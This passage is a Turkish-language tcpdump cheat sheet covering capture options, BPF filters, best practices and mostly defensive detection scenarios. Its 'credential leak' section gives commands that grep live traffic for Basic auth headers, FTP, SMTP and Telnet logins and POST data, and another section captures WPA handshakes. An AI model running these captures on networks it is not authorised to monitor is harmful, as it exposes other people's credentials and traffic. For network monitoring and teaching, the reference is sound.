<count>`**\n*File rotation count.*\n```\ntcpdump -W 5 -w output.pcap\n```\n\n**`-G <seconds>`**\n*Zaman bazlı rotate.*\n```\ntcpdump -G 3600 -w capture_%Y%m%d_%H%M%S.pcap\n```\n\n**`-z <command>`**\n*Rotate sonrası custom komut.*\n```\ntcpdump -C 100 -z gzip -w output.pcap\n```\n\n### Diğer Argümanlar\n\n**`-D`**\n*Interface listesi.*\n```\ntcpdump -D\n```\n\n**`-L`**\n*Link-layer types.*\n```\ntcpdump -L -i eth0\n```\n\n**`-K`**\n*Checksum doğrulamayı atla.*\n```\ntcpdump -K\n```\n\n**`-q`**\n*Quick output (daha az detay).*\n```\ntcpdump -q\n```\n\n**`-l`**\n*Line-buffered output.*\n```\ntcpdump -l | grep 'GET'\n```\n\n**`-U`**\n*Packet-buffered output.*\n```\ntcpdump -U -w output.pcap\n```\n\n## Açıklamalı Komutlar\n\n**HTTP traffic yakalama:**\n```\ntcpdump -i eth0 -nn -A 'tcp port 80'\n```\n*-i eth0: eth0 interface, -nn: No resolution, -A: ASCII dump, tcp port 80: HTTP traffic*\n\n**HTTPS traffic (metadata only):**\n```\ntcpdump -i eth0 -nn 'tcp port 443'\n```\n*-nn: IP ve port sayısal, tcp port 443: HTTPS*\n\n**DNS queries + responses:**\n```\ntcpdump -i eth0 -nn 'udp port 53' -vv\n```\n*-vv: Verbose DNS details*\n\n**Specific subnet:**\n```\ntcpdump -i eth0 'net 192.168.1.0/24'\n```\n*net: Network filter*\n\n**Exclude local traffic:**\n```\ntcpdump -i eth0 'not net 127.0.0.0/8'\n```\n*not: Negation*\n\n**SYN packets only:**\n```\ntcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack = 0'\n```\n*tcp[tcpflags]: TCP flags offset, tcp-syn: SYN flag, tcp-ack: ACK flag*\n\n**TCP port 80 or 443:**\n```\ntcpdump -i eth0 '(tcp port 80) or (tcp port 443)'\n```\n*or: Logical OR*\n\n**Capture to rotating files:**\n```\ntcpdump -i eth0 -C 50 -W 10 -w capture.pcap -Z nobody\n```\n*-C 50: 50MB per file, -W 10: Max 10 files, -Z nobody: Drop privileges*\n\n**ICMP ping capture:**\n```\ntcpdump -i eth0 'icmp[icmptype] = icmp-echo or icmp[icmptype] = icmp-echoreply'\n```\n*icmp[icmptype]: ICMP type offset, icmp-echo: Type 8, icmp-echoreply: Type 0*\n\n**ARP spoofing detection:**\n```\ntcpdump -i eth0 -n arp -e\n```\n*-e: Ethernet header (MAC addresses), arp: ARP protocol*\n\n**SSH traffic:**\n```\ntcpdump -i eth0 'tcp port 22'\n```\n\n**FTP traffic:**\n```\ntcpdump -i eth0 'tcp port 20 or tcp port 21'\n```\n*Port 20: FTP data, Port 21: FTP control*\n\n**SMTP traffic:**\n```\ntcpdump -i eth0 'tcp port 25' -A\n```\n*-A: ASCII (readable email content)*\n\n**Fragmented packets:**\n```\ntcpdump -i eth0 'ip[6:2] & 0x1fff != 0 or ip[6] & 0x20 = 0x20'\n```\n*ip[6:2]: Fragment offset field*\n\n**High traffic capture (metadata only):**\n```\ntcpdump -i eth0 -s 96 -w headers.pcap\n```\n*-s 96: Only headers (no payload)*\n\n**Multiple interfaces:**\n```\ntcpdump -i any 'port 443'\n```\n*-i any: All interfaces*\n\n**Hex dump analysis:**\n```\ntcpdump -i eth0 -XX -c 10 'tcp port 443'\n```\n*-XX: Full hex + link-layer, -c 10: 10 packets*\n\n**Time-based rotation:**\n```\ntcpdump -i eth0 -G 3600 -w /var/log/capture_%Y%m%d_%H%M%S.pcap\n```\n*-G 3600: Rotate every hour, %Y%m%d_%H%M%S: Timestamp format*\n\n**Post-capture compression:**\n```\ntcpdump -i eth0 -C 100 -W 5 -w capture.pcap -z gzip\n```\n*-z gzip: Compress after rotation*\n\n**IPv6 traffic:**\n```\ntcpdump -i eth0 -nn ip6\n```\n*ip6: IPv6 protocol*\n\n## Gerçek Pentest Senaryoları\n\n### Senaryo 1: Port Scanning Tespiti\n\n**SYN scan detection:**\n```\ntcpdump -i eth0 -nn 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack = 0'\n```\n*SYN flag set, ACK flag unset*\n\n**Count SYN packets per source:**\n```\ntcpdump -i eth0 -nn 'tcp[tcpflags] = tcp-syn' | awk '{print $3}' | cut -d'.' -f1-4 | sort | uniq -c | sort -rn\n```\n\n**Detect port sweep:**\n```\ntcpdump -i eth0 -nn 'tcp[tcpflags] = tcp-syn' | awk '{print $5}' | cut -d'.' -f5 | cut -d':' -f1 | sort -u | wc -l\n```\n\n### Senaryo 2: SYN Flood & RST Flood Analizi\n\n**SYN flood monitoring:**\n```\ntcpdump -i eth0 -nn 'tcp[tcpflags] = tcp-syn' -c 10000 -w syn-flood.pcap\n```\n\n**Count SYN rate:**\n```\ntcpdump -i eth0 -nn -tttt 'tcp[tcpflags] = tcp-syn' | awk '{print $1}' | uniq -c\n```\n\n**RST flood detection:**\n```\ntcpdump -i eth0 -nn 'tcp[tcpflags] & tcp-rst != 0' -c 5000\n```\n\n**Analyze RST source:**\n```\ntcpdump -i eth0 -nn 'tcp[tcpflags] & tcp-rst != 0' | awk '{print $3}' | cut -d'.' -f1-4 | sort | uniq -c | sort -rn\n```\n\n### Senaryo 3: DNS Trafik İncelemesi\n\n**All DNS:**\n```\ntcpdump -i eth0 -nn 'udp port 53' -vv\n```\n\n**DNS queries only:**\n```\ntcpdump -i eth0 -nn 'udp port 53 and udp[10] & 0x80 = 0'\n```\n\n**DNS responses:**\n```\ntcpdump -i eth0 -nn 'udp port 53 and udp[10] & 0x80 = 0x80'\n```\n\n**Extract queried domains:**\n```\ntcpdump -i eth0 -nn 'udp port 53' | grep -oP 'A\\? \\K[^ ]+'\n```\n\n**DNS tunneling detection (large queries):**\n```\ntcpdump -i eth0 'udp port 53 and greater 512' -w dns-tunnel.pcap\n```\n\n### Senaryo 4: TLS Handshake Yakalama\n\n**Client Hello:**\n```\ntcpdump -i eth0 'tcp port 443 and tcp[20] = 0x16 and tcp[25] = 0x01'\n```\n\n**Server Hello:**\n```\ntcpdump -i eth0 'tcp port 443 and tcp[20] = 0x16 and tcp[25] = 0x02'\n```\n\n**Full TLS handshake:**\n```\ntcpdump -i eth0 -s 0 'tcp port 443' -w tls-handshake.pcap\n```\n\n**SNI extraction:**\n```\ntcpdump -i eth0 -nn -A 'tcp port 443 and tcp[20] = 0x16' | grep -oP 'server_name.*'\n```\n\n### Senaryo 5: Credential Leak Tespiti\n\n**HTTP Basic Auth:**\n```\ntcpdump -i eth0 -nn -A 'tcp port 80' | grep -i 'authorization: basic'\n```\n\n**FTP credentials:**\n```\ntcpdump -i eth0 -nn -A 'tcp port 21' | grep -iE '(USER|PASS)'\n```\n\n**SMTP credentials:**\n```\ntcpdump -i eth0 -nn -A 'tcp port 25' | grep -i 'AUTH'\n```\n\n**Telnet credentials:**\n```\ntcpdump -i eth0 -nn -A 'tcp port 23'\n```\n\n**HTTP POST data:**\n```\ntcpdump -i eth0 -nn -A 'tcp port 80 and tcp[32:4] = 0x504f5354'\n```\n*POST in hex*\n\n### Senaryo 6: DHCP Starvation / Rogue DHCP Tespiti\n\n**All DHCP:**\n```\ntcpdump -i eth0 -nn 'udp port 67 or udp port 68' -vv\n```\n\n**DHCP DISCOVER:**\n```\ntcpdump -i eth0 'udp port 67 and udp[8] = 0x01'\n```\n\n**DHCP OFFER:**\n```\ntcpdump -i eth0 'udp port 68 and udp[8] = 0x02'\n```\n\n**Rogue DHCP server detection:**\n```\ntcpdump -i eth0 -e 'udp port 67' | awk '{print $2}' | sort -u\n```\n\n### Senaryo 7: MITM Saldırı Analizi\n\n**ARP cache poisoning:**\n```\ntcpdump -i eth0 -nn arp -e\n```\n\n**Detect duplicate IP:**\n```\ntcpdump -i eth0 -nn arp | grep 'is-at' | awk '{print $7, $9}' | sort | uniq -c | sort -rn\n```\n\n**Monitor MAC changes:**\n```\ntcpdump -i eth0 -nn -e 'arp' | awk '{print $3, $7, $9}'\n```\n\n### Senaryo 8: ARP Spoofing Tespiti\n\n**ARP traffic:**\n```\ntcpdump -i eth0 -nn arp -e\n```\n\n**ARP requests:**\n```\ntcpdump -i eth0 'arp[6:2] = 1'\n```\n\n**ARP replies:**\n```\ntcpdump -i eth0 'arp[6:2] = 2'\n```\n\n**Gratuitous ARP:**\n```\ntcpdump -i eth0 -nn arp | grep 'Reply.*is-at' | awk '{if($4==$6) print}'\n```\n\n### Senaryo 9: ICMP Tunnel / Covert Channel Detection\n\n**ICMP traffic:**\n```\ntcpdump -i eth0 -nn icmp -vv\n```\n\n**Large ICMP payloads:**\n```\ntcpdump -i eth0 'icmp and greater 100'\n```\n\n**ICMP with data:**\n```\ntcpdump -i eth0 -X 'icmp'\n```\n\n**Detect ICMP tunneling:**\n```\ntcpdump -i eth0 'icmp[icmptype] = icmp-echo and greater 64' -w icmp-tunnel.pcap\n```\n\n### Senaryo 10: Belirli Protokol Yakalama\n\n**SIP (VoIP):**\n```\ntcpdump -i eth0 'udp port 5060 or tcp port 5060' -A\n```\n\n**RTP (media):**\n```\ntcpdump -i eth0 'udp portrange 10000-20000'\n```\n\n**SNMP:**\n```\ntcpdump -i eth0 'udp port 161 or udp port 162'\n```\n\n**BGP:**\n```\ntcpdump -i eth0 'tcp port 179'\n```\n\n**OSPF:**\n```\ntcpdump -i eth0 'proto ospf'\n```\n\n### Senaryo 11: IoT Cihaz Trafiği İncelemesi\n\n**MQTT:**\n```\ntcpdump -i eth0 'tcp port 1883 or tcp port 8883'\n```\n\n**CoAP:**\n```\ntcpdump -i eth0 'udp port 5683'\n```\n\n**mDNS:**\n```\ntcpdump -i eth0 'udp port 5353'\n```\n\n**UPnP/SSDP:**\n```\ntcpdump -i eth0 'udp port 1900'\n```\n\n### Senaryo 12: WPA/WPA2 Handshake Yakalama\n\n**Monitor mode capture:**\n```\ntcpdump -i wlan0mon -w wpa-handshake.pcap\n```\n\n**EAPOL (4-way handshake):**\n```\ntcpdump -i wlan0mon 'ether proto 0x888e' -w handshake.pcap\n```\n\n### Senaryo 13: VPN Trafik Analizi\n\n**IPsec ESP:**\n```\ntcpdump -i eth0 'proto esp'\n```\n\n**IKE:**\n```\ntcpdump -i eth0 'udp port 500 or udp port 4500'\n```\n\n**OpenVPN:**\n```\ntcpdump -i eth0 'udp port 1194'\n```\n\n**WireGuard:**\n```\ntcpdump -i eth0 'udp port 51820'\n```\n\n### Senaryo 14: Internal Lateral Movement Tespiti\n\n**SMB traffic:**\n```\ntcpdump -i eth0 'tcp port 445 or tcp port 139'\n```\n\n**RDP:**\n```\ntcpdump -i eth0 'tcp port 3389'\n```\n\n**WinRM:**\n```\ntcpdump -i eth0 'tcp port 5985 or tcp port 5986'\n```\n\n**PSExec detection:**\n```\ntcpdump -i eth0 'tcp port 445' -A | grep -i 'psexe'\n```\n\n### Senaryo 15: Firewall Drop Analizi\n\n**ICMP unreachable:**\n```\ntcpdump -i eth0 'icmp[icmptype] = icmp-unreach'\n```\n\n**TCP RST from firewall:**\n```\ntcpdump -i eth0 'tcp[tcpflags] & tcp-rst != 0' -nn\n```\n\n**Admin prohibited:**\n```\ntcpdump -i eth0 'icmp[icmptype] = 3 and icmp[icmpcode] = 13'\n```\n\n## Best Practices\n\n**1. Snaplen Doğru Ayarı:**\n\n**Full packet (analysis):**\n```\ntcpdump -i eth0 -s 0\n```\n\n**Header only (high traffic):**\n```\ntcpdump -i eth0 -s 96\n```\n\n**MTU-based:**\n```\ntcpdump -i eth0 -s 1500\n```\n\n**2. Promiscuous Mode Optimizasyonu:**\n\n**Default (enable):**\n```\ntcpdump -i eth0\n```\n\n**Disable (own traffic only):**\n```\ntcpdump -i eth0 -p\n```\n\n**3. Interface Buffer Overflow Engelleme:**\n\n**Increase buffer:**\n```\ntcpdump -i eth0 -B 8192\n```\n\n**Monitor drops:**\n```\ntcpdump -i eth0 -B 4096 -vv\n# Check "X packets dropped by kernel"\n```\n\n**4. High Traffic Environment Rotation:**\n\n**Size-based:**\n```\ntcpdump -i eth0 -C 100 -W 20 -w /var/log/capture.pcap -Z tcpdump\n```\n\n**Time-based:**\n```\ntcpdump -i eth0 -G 3600 -w /var/log/capture_%Y%m%d_%H%M.pcap -Z tcpdump\n```\n\n**5. Yüksek Hızda Sadece Metadata:**\n\n**Headers only:**\n```\ntcpdump -i eth0 -s 96 -w headers.pcap\n```\n\n**Quick output:**\n```\ntcpdump -i eth0 -q -nn\n```\n\n**6. BPF Filtrelerinin Performans Optimizasyonu:**\n\n**Efficient filter:**\n```\ntcpdump -i eth0 'tcp port 80 or tcp port 443'\n```\n\n**Less efficient:**\n```\ntcpdump -i eth0 | grep -E '(80|443)'\n```\n\n**Pre-compile BPF:**\n```\ntcpdump -d 'tcp port 80' > filter.bpf\n```\n\n**7. Kernel Filtering → User Space Filtering:**\n\n**Kernel (efficient):**\n```\ntcpdump -i eth0 'tcp port 80'\n```\n\n**User-space (inefficient):**\n```\ntcpdump -i eth0 | grep ':80'\n```\n\n**8. Offline Pcap Analizi Workflow:**\n\n**Extract specific traffic:**\n```\ntcpdump -r large.pcap 'tcp port 443' -w https.pcap\n```\n\n**Filter by time:**\n```\ntcpdump -r capture.pcap -tttt | awk '$1" "$2 >= "2024-01-01 10:00:00"'\n```\n\n**Statistics:**\n```\ntcpdump -r capture.pcap -qn | awk '{print $3}' | cut -d'.' -f1-4 | sort | uniq -c\n```\n\n**9. SIEM / Packet Broker Entegrasyonu:**\n\n**Syslog format:**\n```\ntcpdump -i eth0 -l -nn | logger -t tcpdump\n```\n\n**JSON output (with script):**\n```\ntcpdump -i eth0 -l -nn | awk '{print "{\\"timestamp\\":\\""$1"\\",\\"src\\":\\""$3"\\",\\"dst\\":\\""$5"\\"}"}'\n```\n\n**10. Live Debugging Minimal Filtration:**\n\n**Monitor specific host:**\n```\ntcpdump -i eth0 -nn host 192.168.1.100\n```\n\n**Exclude noise:**\n```\ntcpdump -i eth0 -nn 'not port 22 and not arp'\n```\n\n## Sık Yapılan Hatalar\n\n**1. Snaplen düşük bırakmak:**\n```\n# YANLIŞ (truncated packets)\ntcpdump -i eth0 -s 64\n\n# DOĞRU\ntcpdump -i eth0 -s 0\n```\n\n**2. DNS/port resolution açık:**\n```\n# YANLIŞ (slow)\ntcpdump -i eth0\n\n# DOĞRU\ntcpdump -i eth0 -nn\n```\n\n**3. Buffer küçük:**\n```\n# YANLIŞ (dropped packets)\ntcpdump -i eth0\n\n# DOĞRU\ntcpdump -i eth0 -B 4096\n```\n\n**4. Filtre yazmadan capture:**\n```\n# YANLIŞ (huge file)\ntcpdump -i eth0 -w capture.pcap\n\n# DOĞRU\ntcpdump -i eth0 'port 80 or port 443' -w capture.pcap\n```\n\n**5. Promiscuous mode yanlış:**\n```\n# YANLIŞ (switch'te çalışmaz)\ntcpdump -i eth0 -p\n\n# DOĞRU (monitor all)\ntcpdump -i eth0\n```\n\n**6. Rotate kullanmadan uzun capture:**\n```\n# YANLIŞ (single huge file)\ntcpdump -i eth0 -w capture.pcap\n\n# DOĞRU\ntcpdump -i eth0 -C 100 -W 10 -w capture.pcap\n```\n\n**7. Multi-interface fark etmemek:**\n```\n# YANLIŞ (single interface)\ntcpdump -i eth0\n\n# DOĞRU (all interfaces)\ntcpdump -i any\n```\n\n**8. IPv6 trafiğini ihmal etmek:**\n```\n# YANLIŞ (IPv4 only)\ntcpdump -i eth0 ip\n\n# DOĞRU (both)\ntcpdump -i eth0 'ip or ip6'\n```\n\n**9. VLAN-tagged paketleri kaçırmak:**\n```\n# YANLIŞ (VLAN unaware)\ntcpdump -i eth0 'tcp port 80'\n\n# DOĞRU\ntcpdump -i eth0 'vlan and tcp port 80'\n```\n\n**10. Privilege drop unutmak:**\n```\n# YANLIŞ (security risk)\ntcpdump -i eth0 -w /tmp/capture.pcap\n\n# DOĞRU\ntcpdump -i eth0 -w /tmp/capture.pcap -Z nobody\n```\n\n## BPF Filter Referansı\n\n**Primitives:**\n```\nhost        # IP address\nnet         # Network\nport        # Port number\nportrange   # Port range\nsrc         # Source\ndst         # Destination\nproto       # Protocol (tcp, udp, icmp, etc.)\n```\n\n**Qualifiers:**\n```\ntcp         # TCP protocol\nudp         # UDP protocol\nicmp        # ICMP protocol\nip          # IPv4\nip6         # IPv6\narp         # ARP\nether       # Ethernet\nvlan        # VLAN tagged\n```\n\n**Operators:**\n```\nand (&&)    # Logical AND\nor (||)     # Logical OR\nnot (!)     # Logical NOT\n```\n\n**Examples:**\n```\ntcp and port 80\nnot arp and not icmp\nhost 192.168.1.1 and (port 80 or port 443)\n```\n\n## İpuçları\n\n**Interface list:**\n```\ntcpdump -D\n```\n\n**BPF syntax check:**\n```\ntcpdump -d 'tcp port 80'\n```\n\n**Packet count:**\n```\ntcpdump -r capture.pcap | wc -l\n```\n\n**File info:**\n```\ntcpdump -r capture.pcap -nn -c 1\n```\n\n**Convert to text:**\n```\ntcpdump -r capture.pcap -nn -tttt > capture.txt\n```\n\n**Split by protocol:**\n```\ntcpdump -r capture.pcap 'tcp' -w tcp.pcap\ntcpdump -r capture.pcap 'udp' -w udp.pcap\n```\n	{tcpdump,packet,capture,network,analysis}	{https://www.tcpdump.org/,https://www.tcpdump.org/manpages/tcpdump.1.html}	195	2026-01-23 22:21:30.265	2026-01-23 22:21:30.265
